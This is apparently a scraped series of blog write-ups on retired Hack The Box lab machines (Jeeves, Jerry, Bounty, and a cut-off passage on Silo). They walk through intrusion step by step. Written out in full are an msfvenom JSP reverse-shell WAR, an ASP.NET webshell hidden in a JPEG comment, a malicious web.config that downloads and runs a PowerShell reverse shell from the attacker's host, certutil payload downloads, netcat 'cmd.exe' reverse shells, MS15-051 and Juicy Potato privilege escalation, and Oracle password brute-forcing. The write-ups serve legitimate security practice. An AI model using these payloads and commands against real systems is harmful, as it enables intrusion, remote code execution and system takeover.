Opening SVCManager on 10.10.10.63..... [*] Creating service tzQb on 10.10.10.63..... [*] Starting service tzQb..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.10586] (c) 2015 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami nt authority\\system The attempt worked and we are now logged in as \"system\" and we should be able to grab the root flag. C:\\Users\\Administrator\\Desktop>dir Volume in drive C has no label. Volume Serial Number is BE50-B1C9 Directory of C:\\Users\\Administrator\\Desktop 11/08/2017 10:05 AM <DIR> . 11/08/2017 10:05 AM <DIR> .. 12/24/2017 03:51 AM 36 hm.txt 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 7,533,301,760 bytes free C:\\Users\\Administrator\\Desktop>type hm.txt The flag is elsewhere. Look deeper. However, the above output shows that there is a hm.txt file which tells us \"The flag is elsewhere. Look deeper.\". So I look for hidden files: C:\\Users\\Administrator\\Desktop>dir /A Volume in drive C has no label. Volume Serial Number is BE50-B1C9 Directory of C:\\Users\\Administrator\\Desktop 11/08/2017 10:05 AM <DIR> . 11/08/2017 10:05 AM <DIR> .. 11/03/2017 10:03 PM 282 desktop.ini 12/24/2017 03:51 AM 36 hm.txt 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk 3 File(s) 1,115 bytes 2 Dir(s) 7,533,301,760 bytes free but only found a .ini file which is not relevant. Here I got stuck for a while. Eventually I had a look at ippsec video as usual and learned about the Display Alternate Data Stream : \"Display Alternate Data Streams (ADS): The /R switch displays any alternate data streams (ADS) that files might contain. ADS are a feature of the NTFS file system that let files contain additional metadata for locating files by author and title.\" C:\\Users\\Administrator\\Desktop>dir /r Volume in drive C has no label. Volume Serial Number is BE50-B1C9 Directory of C:\\Users\\Administrator\\Desktop 11/08/2017 10:05 AM <DIR> . 11/08/2017 10:05 AM <DIR> .. 12/24/2017 03:51 AM 36 hm.txt 34 hm.txt:root.txt:$DATA 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 7,533,301,760 bytes free So we see another file, hm.txt:root.txt:$DATA which we can read it using this command: C:#Users#Administrator#Desktop>powershell (get-content hm.txt -Stream root.txt) af****************************30","tags":"blogging","loc":"https://sittingducks.io/Jeeves.html","title":"Jeeves"},{"url":"https://sittingducks.io/Jerry.html","text":"Jerry was probably the easiest HTB box I have powned so far. Before starting doing anything complex I tried the basic. There is a Tomcat server with default credentials to access the management module. Once inside was very easy to upload a war file to get a shell. Surprisingly, I didn't have to root the box since I got an administrative shell! NMAP ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bounty] └──╼ $nmap -sC -sV 10.10.10.95 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-22 06:17 BST Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 3.24 seconds ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bounty] └──╼ $nmap -sC -sV 10.10.10.95 -Pn Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-22 06:17 BST Nmap scan report for 10.10.10.95 Host is up (0.11s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 |_http-title: Apache Tomcat/7.0.88 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.70 seconds Nmap shows there is a Tomcat server running on port 8080 so let's have a look: The above figure shows that the Tomcat server is still on its default configuration page. When I find these kind of default configuration the first thing I do is to try very basic and standard things. I open the \"Manage App\" tab and I am prompted for credentials: I started to try couple of potential combinations and after few tried I had this page: From that page I see some credentials which could be the default ones so I decide to give it a try. To do that I had to restart my browser. The credentials worked and I am in as shown above. I also noticed there is an upload section where we can upload a war file. So I create a war shell with msfvenom as follow: ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jerry] └──╼ $msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f war -o shell.war Payload size: 1086 bytes Final size of war file: 1086 bytes Saved as: shell.war Once the shell is uploaded I see it listed: All I have to do it now is to browse to the shell address: At this stage I obtain the shell on a netcat listener I had prepared: ┌─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/jerry] └──╼ $sudo nc -lnvp 443 [sudo] password for m4rc0: listening on [any] 443 ... connect to [10.10.14.4] from (UNKNOWN) [10.10.10.95] 49195 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\apache-tomcat-7.0.88>whoami whoami nt authority\\system Surprisingly I am already system so we have permission to get both the user.txt and root.txt. C:\\Users\\Administrator\\Desktop>dir dir Volume in drive C has no label. Volume Serial Number is FC2B-E489 Directory of C:\\Users\\Administrator\\Desktop 06/19/2018 07:09 AM <DIR> . 06/19/2018 07:09 AM <DIR> .. 06/19/2018 07:09 AM <DIR> flags 0 File(s) 0 bytes 3 Dir(s) 27,583,991,808 bytes free C:\\Users\\Administrator\\Desktop>cd flags cd flags C:\\Users\\Administrator\\Desktop\\flags>dir dir Volume in drive C has no label. Volume Serial Number is FC2B-E489 Directory of C:\\Users\\Administrator\\Desktop\\flags 06/19/2018 07:09 AM <DIR> . 06/19/2018 07:09 AM <DIR> .. 06/19/2018 07:11 AM 88 2 for the price of 1.txt 1 File(s) 88 bytes 2 Dir(s) 27,583,991,808 bytes free C:\\Users\\Administrator\\Desktop\\flags>type 2 for the price of 1.txt type 2 for the price of 1.txt C:\\Users\\Administrator\\Desktop\\flags>type \"2 for the price of 1.txt\" type \"2 for the price of 1.txt\" user.txt 70****************************00 root.txt 04****************************0e","tags":"blogging","loc":"https://sittingducks.io/Jerry.html","title":"Jerry"},{"url":"https://sittingducks.io/Bounty.html","text":"Bounty is a relatively easy box to root. I think the most tedious part is to get the initial foothold since the process requires to embed ASP code in a IIS configuration file, web.config . Once initial access is obtained the victim OS is a vanilla Win 2008 R2 which can be rooted in several ways. I did root it twice with two different methods. Recon ┌─[m4rc0@SittingDucks]─[~] └──╼ $nmap -sC -sV -p- 10.10.10.93 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-16 11:51 BST Nmap scan report for 10.10.10.93 Host is up (0.11s latency). Not shown: 65534 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: Bounty Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 293.33 seconds Looks like we only have an IIS v7.5 httpd service running on Browsing to the webpage does provide only the above image which is not very helpful. Let's see if we manage to find some directories with gobuster . ┌─[m4rc0@SittingDucks]─[~] └──╼ $gobuster dir --url http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.10.93 [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/04/16 12:08:38 Starting gobuster =============================================================== /UploadedFiles (Status: 301) /uploadedFiles (Status: 301) /uploadedfiles (Status: 301) =============================================================== 2020/04/16 12:49:14 Finished =============================================================== I check all the 3 directories but I got this message: 403 - Forbidden: Access is denied. You do not have permission to view this directory or page using the credentials that you supplied. I also run Nikto to see if I can find something interesting: ┌─[m4rc0@SittingDucks]─[~] └──╼ $nikto --url http://10.10.10.93 - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.10.93 + Target Hostname: 10.10.10.93 + Target Port: 80 + Start Time: 2020-04-16 13:50:06 (GMT1) --------------------------------------------------------------------------- + Server: Microsoft-IIS/7.5 + Retrieved x-powered-by header: ASP.NET + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Retrieved x-aspnet-version header: 2.0.50727 + No CGI Directories found (use '-C all' to force check all possible dirs) + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST + Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST + 7863 requests: 0 error(s) and 7 item(s) reported on remote host + End Time: 2020-04-16 14:05:31 (GMT1) (925 seconds) --------------------------------------------------------------------------- + 1 host(s) tested Probably the only useful info from the above output is that IIS is using ASP.net so we can expect to have asp or aspx pages. Looking for exploits with searchsploit I get this: ┌─[m4rc0@SittingDucks]─[~] └──╼ $searchsploit iis 7.5 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities | exploits/windows/remote/19033.txt Microsoft IIS 7.5 (Windows 7) - FTPSVC Unauthorized Remote Denial of Service (PoC) | exploits/windows/dos/15803.py ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result The first one in the list could be relevant so I have a look inside ( searchsploit -x 19033 ) and found this bit that is interesting: ------------------------------------------------------------------------------------------------------------------------------------------------------------ Title: Microsoft IIS 7.5 Classic ASP Authentication Bypass Affected Software: Microsoft IIS 7.5 with configured Classic ASP and .NET Framework 4.0 installed (.NET Framework 2.0 is unaffected, other .NET frameworks have not been tested) (tested on Windows 7) Details: By appending \":$i30:$INDEX_ALLOCATION\" to the directory serving the classic ASP file access restrictions can be successfully bypassed. Take this Example: 1.) Microsoft IIS 7.5 has Classic ASP configured (it allows serving .asp files) 2.) There is a password protected directory configured that has administrative asp scripts inside 3.) An attacker requests the directory with :$i30:$INDEX_ALLOCATION appended to the directory name 4.) IIS/7.5 gracefully executes the ASP script without asking for proper credentials ------------------------------------------------------------------------------------------------------------------------------------------------------------ I tried to append this to the UploadedFiles directory found with gobuster but didn't get anywhere. Since we know about ASP.NET being used I decided to do another scan with gobuster including more extensions (adding the -x asp,aspx option): The search yielded two additional results, apsnet_client and transfer.aspx . When checking with a browser, aspnet_client gave the same permission error as UploadedFiles , whereas transfer.aspx showed this: Now the first thought is \"Cool, let's upload a shell\" which is fair. However, we need to see what kind of files can be uploaded. In this scenario we would better use an aspx shell but before we generate the shell let's verify we can upload a dummy aspx file. I create a file called bounty.aspx which contains some text. Then when I try to upload it I get the error: Invalid File. Please try again I then open Burp to catch the POST request sent to the web server for the file upload: POST /transfer.aspx HTTP/1.1 Host: 10.10.10.93 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------1317515723955044403533213944 Content-Length: 837 Origin: http://10.10.10.93 DNT: 1 Connection: close Referer: http://10.10.10.93/transfer.aspx Upgrade-Insecure-Requests: 1 -----------------------------1317515723955044403533213944 Content-Disposition: form-data; name=\"__VIEWSTATE\" /wEPDwUKMTI3ODM5MzQ0Mg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YRYCAgUPDxYGHgRUZXh0BR5JbnZhbGlkIEZpbGUuIFBsZWFzZSB0cnkgYWdhaW4eCUZvcmVDb2xvcgqNAR4EXyFTQgIEZGRkEcv0Jjmp3XbuMPOLap1nb79sh/A= -----------------------------1317515723955044403533213944 Content-Disposition: form-data; name=\"__EVENTVALIDATION\" /wEWAgLAitHnCwLt3oXMA6hPklThrKieTzE01/4B0zpapoWd -----------------------------1317515723955044403533213944 Content-Disposition: form-data; name=\"FileUpload1\"; filename=\"bounty.aspx\" Content-Type: text/plain Hello World -----------------------------1317515723955044403533213944 Content-Disposition: form-data; name=\"btnUpload\" Upload -----------------------------1317515723955044403533213944-- Now I send this request to the repeater and I change the filename=\"bounty.aspx\" trying different extensions. When I try, for example, filename=\"bounty.jpg I get a successful response: File uploaded successfully I suspect that the UploadedFile directory we saw earlier will be the location where the files, once uploaded, will end up. So I create a jpg with the HTB logo and upload it. Then I check the directory and I get this: this confirms the suspicion. Now, I need to find a way to upload something that can get me code execution. I explored the option of embedding aspx code within a jpg with exiftool . I basically took a cmdasp shell available in my ParrotOS box at /usr/share/webshells/aspx/cmdasp.aspx , I edited a bit the code making it a oneliner and making sure to escape the C# code with \\ , then run exiftool as follow: exiftool -comment=\"<script Language=\\\"c#\\\" runat=\\\"server\\\"> void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName =\\\"cmd.exe\\\";psi.Arguments =\\\"/c \\\"+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(\\\"<pre>\\\");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(\\\"</pre>\\\");}</script><HTML><HEAD><title>awen asp.net webshell</title></HEAD><body ><form id=\\\"cmd\\\" method=\\\"post\\\" runat=\\\"server\\\"><asp:TextBox id=\\\"txtArg\\\" style=\\\"Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px\\\" runat=\\\"server\\\" Width=\\\"250px\\\"></asp:TextBox><asp:Button id=\"testing\" style=\\\"Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px\\\" runat=\\\"server\\\" Text=\\\"excute\\\" OnClick=\\\"cmdExe_Click\\\"></asp:Button><asp:Label id=\\\"lblText\\\" style=\\\"Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px\\\" runat=\\\"server\\\">Command:</asp:Label></form></body></HTML>\" htb.jpg I obtained an image called htb.jpg which contains the above code in the comments section. Once the image is fetched from the webpage it should execute the code in the comments. This shows the file content: ─[m4rc0@SittingDucks]─[~/Documents/htb/boxes/bounty] └──╼ $exiftool htb.jpg ExifTool Version Number : 11.93 File Name : htb.jpg Directory : . File Size : 8.9 kB File Modification Date/Time : 2020:04:16 23:19:09+01:00 File Access Date/Time : 2020:04:16 23:19:09+01:00 File Inode Change Date/Time : 2020:04:16 23:19:09+01:00 File Permissions : rw-r--r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Resolution Unit : inches X Resolution : 96 Y Resolution : 96 Comment : <script Language=\"c#\" runat=\"server\"> void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName =\"cmd.exe\";psi.Arguments =\"/c \"+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(\"<pre>\");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(\"</pre>\");}</script><HTML><HEAD><title>awen asp.net webshell</title></HEAD><body ><form id=\"cmd\" method=\"post\" runat=\"server\"><asp:TextBox id=\"txtArg\" style=\"Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px\" runat=\"server\" Width=\"250px\"></asp:TextBox><asp:Button id=testing style=\"Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px\" runat=\"server\" Text=\"excute\" OnClick=\"cmdExe_Click\"></asp:Button><asp:Label id=\"lblText\" style=\"Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px\" runat=\"server\">Command:</asp:Label></form></body></HTML> Image Width : 195 Image Height : 187 Encoding Process : Baseline DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:2:0 (2 2) Image Size : 195x187 Megapixels : 0.036 Unfortnuately that did not work! I then found a list of most common extenions here and rather than trying all of them at once I will use burp to automate the process. First I insert all the extensions on a text file, then I capture the file upload POST request to burp and I pass it to the the burp Intruder module. Once in the Intruder module the request will look like the following: The bit we need to change is filename=\"htb.§PAYLOAD§\" where PAYLOD between these strange symbols is basically the file with the extensions I created. To tell burp which payload to use we need to move on the \"Payloads\" tab and load the payload as shown below: After that we launch the attack and we obtain this result: We can see that all the 30 results have a code \"200\". I noticed that few of the extensions show a different response lenght, that is 1350 instead of 1355. Upon checking the response lenght 1350 indicates the successful upload and 1355 a failed upload. So doc , docx , xls , xlsx can be uploaded. However, I researched and explored options like I did for the jpg but I didn't get anywhere. At some point, while testing I forgot a quote in the filename and I got a response error as shown belog: The error gives some clues about a WebConfig file and after some research I found it's a typical IIS config file. I did an attempt to upload a test.config file and it was successful. I also found online interesting facts about malicious WebConfig files with embedded webshells. Specifically I found this page . While testing I noticed that the files uploaded to the web server get deleted after a minute or so. So although getting a webshell is certainly possible I will go straight onto getting a reverse shell as it will be persistent. I explored few options and I grabbed a powershell script available in my attacking box at /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 . To invoke a callback to my ParrotOS box I need to add a this line at the end of the Invoke-PowerShellTcp.ps1 script: Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.15 -Port 443 Then I take a simple web.config template and I add the asp code at the end in a way that once executed it calls the powershell script: <?xml version=\"1.0\" encoding=\"UTF-8\"?> <configuration> <system.webServer> <handlers accessPolicy= \"Read, Script, Write\" > <add name= \"web_config\" path= \"*.config\" verb= \"*\" modules= \"IsapiModule\" scriptProcessor= \"%windir%\\system32\\inetsrv\\asp.dll\" resourceType= \"Unspecified\" requireAccess= \"Write\" preCondition= \"bitness64\" /> </handlers> <security> <requestFiltering> <fileExtensions> <remove fileExtension= \".config\" /> </fileExtensions> <hiddenSegments> <remove segment= \"web.config\" /> </hiddenSegments> </requestFiltering> </security> </system.webServer> </configuration> <!-- ASP code comes here! It should not include HTML comment closing tag and double dashes! <%@ Language=VBScript %> <% call Server.CreateObject(\"WSCRIPT.SHELL\").Run(\"cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.15/Invoke-PowerShellTcp.ps1')\") %> At this state I host the poweshell script with a simple python http server and I also start a netcat listener on port 443. I then upload the web.config file and I browse to it, the result is the following: ┌─[✗]─[m4rc0@SittingDucks]─[~] └──╼ $sudo nc -lnvp 443 [sudo] password for m4rc0: listening on [any] 443 ... connect to [10.10.14.15] from (UNKNOWN) [10.10.10.93] 49174 Windows PowerShell running as user BOUNTY$ on BOUNTY Copyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\\windows\\system32\\inetsrv>PS C:\\windows\\system32\\inetsrv> whoami bounty\\merlin Finally got a reverse shell and the whoami command shows that I am logged in as the merlin user. So I move to the merlin Desktop to look for the flag: PS C:\\users\\merlin\\Desktop> dir PS C:\\users\\merlin\\Desktop> The dir command shows no results. Maybe the file is hidden or it is somewhere else. PS C:\\users\\merlin\\Desktop> dir -force Directory: C:\\users\\merlin\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a-hs 5/30/2018 12:22 AM 282 desktop.ini -a-h- 5/30/2018 11:32 PM 32 user.txt PS C:\\users\\merlin\\Desktop> type user.txt e2****************************2f In fact dir -force command shows the file is there and we can read it. Let's see how we can get the root flag. PS C:\\windows\\system32\\inetsrv> systeminfo Host Name: BOUNTY OS Name: Microsoft Windows Server 2008 R2 Datacenter OS Version: 6.1.7600 N/A Build 7600 OS Manufacturer: Microsoft Corporation OS Configuration: Standalone Server OS Build Type: Multiprocessor Free Registered Owner: Windows User Registered Organization: Product ID: 55041-402-3606965-84760 Original Install Date: 5/30/2018, 12:22:24 AM System Boot Time: 4/20/2020, 5:13:21 PM System Manufacturer: VMware, Inc. System Model: VMware Virtual Platform System Type: x64-based PC Processor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz BIOS Version: Phoenix Technologies LTD 6.00, 12/12/2018 Windows Directory: C:\\Windows System Directory: C:\\Windows\\system32 Boot Device: \\Device\\HarddiskVolume1 System Locale: en-us;English (United States) Input Locale: en-us;English (United States) Time Zone: (UTC+02:00) Athens, Bucharest, Istanbul Total Physical Memory: 2,047 MB Available Physical Memory: 1,581 MB Virtual Memory: Max Size: 4,095 MB Virtual Memory: Available: 3,559 MB Virtual Memory: In Use: 536 MB Page File Location(s): C:\\pagefile.sys Domain: WORKGROUP Logon Server: N/A Hotfix(s): N/A Network Card(s): 1 NIC(s) Installed. [01]: Intel(R) PRO/1000 MT Network Connection Connection Name: Local Area Connection DHCP Enabled: No IP address(es) [01]: 10.10.10.93 The above systeminfo output gives us clues that this is a vanilla Windows Server 2008 R2 since it has no hotfixes installed. Therefore there will be several exploits we could try. At this stage it was very easy because I had recently rooted another htb box , Bastard, with the same OS version using exploit for MS15-051. So I have used the exact same procedure to grab the root.txt which worked like a charm. I download both a 64-bit version of netcat and the MS15-051 exploit in the victim box with certutil : PS C:\\users\\public> certutil -urlcache -split -f http://10.10.14.15/nc64.exe nc.exe **** Online **** 0000 ... b0d8 CertUtil: -URLCache command completed successfully. PS C:\\users\\public> certutil -urlcache -split -f http://10.10.14.15/ms15-051.exe **** Online **** 0000 ... d800 CertUtil: -URLCache command completed successfully. I get a privileged shell: running the script PS C:\\users\\public> ./ms15-051.exe \"nc.exe -e cmd.exe 10.10.14.15 1234\" and listening on port 1234 with netcat: ┌─[✗]─[m4rc0ff@SittingDucks]─[~/Tools] └──╼ $sudo nc -lvnp 1234 listening on [any] 1234 ... connect to [10.10.14.15] from (UNKNOWN) [10.10.10.93] 49167 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\users\\public>whoami whoami nt authority\\system C:\\Users\\Administrator\\Desktop>type root.txt type root.txt c8****************************ea Since it was too easy to get both flags I decided to repeat the same procedure with a different method, that is using Juicy Potato , a local privilege escalation tool. This tool leverages a vulnerability which theory is explained here . The idea behind this vulnerability is simple. To describe at a high level: 1. Trick the \"NT AUTHORITY\\SYSTEM\" account into authenticating via NTLM to a TCP endpoint we control. 2. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the \"NT AUTHORITY\\SYSTEM\" account. This is done through a series of Windows API calls. 3. Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts. Accordingly, the concept of Juicy Potato is simple too: \"If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM\". Before starting this other method I check if I have the requirements: PS C:\\users\\merlin\\desktop> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeAuditPrivilege Generate security audits Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled From the above output we can see SeImpersonatePrivilege is enabled, therefore we should be able to use the tool with no issues. First I donwload the project from github and compile the solution file with MS Vistual Studio to obtain an exe. Then I download the exe to Bounty with certutil. PS C:\\users\\public> certutil -urlcache -split -f http://10.10.14.15/JuicyPotato.exe jp.exe **** Online **** 000000 ... 054e00 CertUtil: -URLCache command completed successfully. Then I run Juicy Potato so that it does its magic to give me a privileged netcat reverse shell: PS C:\\users\\public> ./jp.exe -l 1234 -t * -p nc.exe -a \"-e cmd.exe 10.10.14.15 4444\" -c \"{03ca98d6-ff5d-49b8-abc6-03dd84127020}\" Testing {03ca98d6-ff5d-49b8-abc6-03dd84127020} 1234 .... [+] authresult 0 {03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\\SYSTEM [+] CreateProcessWithTokenW OK On my ParrotOS box I had setup a netcat listener on port 4444 so I get this: ┌─[✗]─[m4rc0ff@SittingDucks]─[~/Tools] └──╼ $sudo nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.15] from (UNKNOWN) [10.10.10.93] 49184 Microsoft Windows [Version 6.1.7600] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Windows\\system32>whoami whoami nt authority\\system","tags":"blogging","loc":"https://sittingducks.io/Bounty.html","title":"Bounty"},{"url":"https://sittingducks.io/Silo.html","text":"Welcome to another retired box from HTB named Silo. This box was really interesting as for the first time I experienced PenTesting against an Oracle db. To me this is more relevant than, for example, working with a wordpress exploit. Although the latter would still be very useful for learning purposes, it is very unlikely I will find some of my customers running wordpress. It is, on the other hand, very common that customers I work with use Orable db or similar technologies. I found the box relatively easy thanks to a tool call odat , even if its installation could be somewhat tedious. I had another issue with a special character where I got stuck but eventually found a workaround. NMAP ┌─[✗]─[m4rc0@SittingDucks]─[~] └──╼ $nmap -sV -sC 10.10.10.82 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-14 05:36 BST Nmap scan report for 10.10.10.82 Host is up (0.11s latency). Not shown: 988 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 |_http-title: IIS Windows Server 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49158/tcp open msrpc Microsoft Windows RPC 49160/tcp open oracle-tns Oracle TNS listener (requires service name) 49161/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -36s, deviation: 0s, median: -36s |_smb-os-discovery: ERROR: Script execution failed (use -d to debug) | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: supported | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-14T04:39:19 |_ start_date: 2020-04-14T03:54:10 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 198.40 seconds There are quite few open ports. One of these is the default port 80 which gives us the default IIS welcome page when launching it from a browser. We know we are dealing with a Windows box and probably a Windows Server 2008 R2 as shown in the nmap output. Furthermore, we can see there is an Oracle listener running. After some research I found a great tool called odat , Oracle Database Attacking Tool, which we can use in this scenario. The installation requires quite few steps to be honest but it is eventually worth it! Once installed, following the instructions at https://github.com/quentinhardy/odat, we can run the following command to guess the Oracle SID, that is the Oracle System ID used to uniquely identify a database on a system. ┌─[m4rc0@SittingDucks]─[~/Tools/odat] └──╼ $python3 odat.py sidguesser -s 10.10.10.82 -p 1521 odat.py:52: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses import imp [1] (10.10.10.82:1521): Searching valid SIDs [1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server [+] 'XE' is a valid SID. Continue... ################################################################################################################################################################## | ETA: 00:00:01 [+] 'XEXDB' is a valid SID. Continue... 100% |#####################################################################################################################################################################################################################| Time: 00:03:15 [1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521) 100% |#####################################################################################################################################################################################################################| Time: 00:00:06 [1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521) [+] 'XE' is a valid SID. Continue... ############################################################################################################################################ | ETA: 00:00:18 100% |#####################################################################################################################################################################################################################| Time: 00:02:51 [+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB From the output we deduct there are two SIDs, XE and XEXDB . Now that we have the SID we can try to guess the password this way: ┌─[m4rc0@SittingDucks]─[~/Tools/odat] └──╼ $python3 odat.py passwordguesser -s 10.10.10.82 -d XE [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521 The login CIS has already been tested at least once. What do you want to do: | ETA: 00:08:35 - stop (s/S) - continue and ask every time (a/A) - continue without to ask (c/C) c 100% |#####################################################################################################################################################################################################################| Time: 00:11:33 [-] No found a valid account on 10.10.10.82:1521/XE. You should try with the option '--accounts-file accounts/accounts_multiple.txt' or '--accounts-file accounts/logins.txt accounts/pwds.txt' After about 10 minutes odat did not find anything. After some more research I found someone on the web suggesting to use metasploit Oracle wordlist file because it contains non-capital and capital words whereas odat default wordlist file contains words only in capital. Odat default wordlist file is located under odat/accounts/accounts.txt and it contains credentials on this format: USER/PASSWORD whwreas metasploit wordlist file contains the credentials in this format: USER PASSWORD So I changed the format of the oracle wordlist file to be the same as the odat default one. I did this within vim by running :%s/ /\\//g . After that I re-ran the command using the new wordlist file: ┌─[✗]─[m4rc0@SittingDucks]─[~/Tools/odat] └──╼ $python3 odat.py passwordguesser -s 10.10.10.82 -d XE --accounts-file accounts/oracle_default_userpass.txt [1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521 The login cdemo82 has already been tested at least once. What do you want to do: | ETA: 00:09:32 - stop (s/S) - continue and ask every time 